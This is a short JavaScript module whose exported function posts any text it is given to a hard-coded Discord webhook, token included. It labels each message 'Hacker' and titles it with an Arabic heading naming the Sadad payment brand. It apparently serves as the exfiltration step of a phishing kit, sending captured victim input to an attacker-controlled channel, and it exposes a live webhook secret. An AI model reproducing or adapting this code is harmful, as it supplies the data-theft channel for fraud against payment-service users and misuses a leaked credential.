import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1323844668940615741/EctNhDoxFMoRPZyp5pdKVzrtiCiyAyBwoH6spVVCzTzz6fDVc3ALn_h7DDZ1Tw5PbdoL",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
